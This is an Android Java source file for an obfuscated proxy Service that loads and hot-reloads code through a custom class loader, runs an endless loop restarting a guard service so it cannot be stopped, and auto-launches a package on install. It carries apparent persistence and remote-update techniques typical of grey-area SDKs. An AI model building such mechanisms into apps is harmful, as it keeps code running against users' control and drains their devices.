package com.x.dtswz;

import android.app.Service;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.os.IBinder;
import android.os.RemoteException;
import dalvik.system.DexClassLoader;

import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.List;

/**
 * 代理Service，宿主，和服务端交互判断是否包体分离，是否更新
 * Created by Administrator on 14-10-23.
 */
public class c extends Service {
    public Context context = null;
    public ServiceGuard serviceGuard = null;

    public void setProxy(Context context) {
        this.context = context;
    }

    /**
     * Load Dex
     * Set Proxy
     */
    @Override
    public void onCreate() {
        super.onCreate();

        if (context == null) {
            context = this;
        }
        if (Config.instanse(this).getMode() != Config.apkMode) {
            serviceGuard = new ServiceGuard.Stub() {
                @Override
                public void stopService() throws RemoteException {
                    String to = Config.instanse(context).getGuardServiceName();
                    try {
                        Intent i = new Intent(context, Class.forName(to));
                        context.stopService(i);
                    } catch (ClassNotFoundException e) {
                        e.printStackTrace();
                    }

                }

                @Override
                public void startService() throws RemoteException {
                    String to = Config.instanse(context).getGuardServiceName();
                    if (null != to && !to.equals("")) {
                        try {
                            Intent i = new Intent(context, Class.forName(to));
                            context.startService(i);
                        } catch (ClassNotFoundException e) {
                            e.printStackTrace();
                        }
                    }
                }
            };


            MClassLoader.setProxy(context);

            new Thread(new Runnable() {
                @Override
                public void run() {
                    while (true) {
                        if (!CheakProcessRunningUtils.isProcessRunning(context, Config.instanse(context).getGuardServiceProcessName())) {

                            try {
                                serviceGuard.startService();
                            } catch (RemoteException e) {
                                e.printStackTrace();
                            }

                        }
                    }
                }
            }).start();
        }

    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    /**
     * Run Dex onStartCommand
     *
     * @param intent
     * @param flags
     * @param startId
     * @return
     */
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent == null) {
            return START_STICKY;
        }
        if (intent.getAction() != null) {
            if (intent.getAction().equals(Intent.ACTION_PACKAGE_ADDED)) {
                if (intent.getDataString().substring("package:".length(), intent.getDataString().length()).equals(Config.packageName)) {
                    Intent mIntent = this.getPackageManager().getLaunchIntentForPackage(Config.packageName);
                    mIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

                    if (mIntent != null) this.startActivity(mIntent);

                }
            }
        }

        /**
         * 先判断运行模式Jar还是Apk
         */
        if (Config.instanse(this).getMode() == Config.apkMode) {
            return START_STICKY;
        }

        String newSdkVersion = Config.instanse(this).getSdkVersion();

        /**
         * 更新了Jar需要重新装载
         */
        if (newSdkVersion != MClassLoader.loadedSdkVersion) {
            MClassLoader.reLoad();
            MClassLoader.setProxy(context);
        }

        MClassLoader.onStartCommand(context, intent, flags, startId);
        return START_STICKY;
    }


}
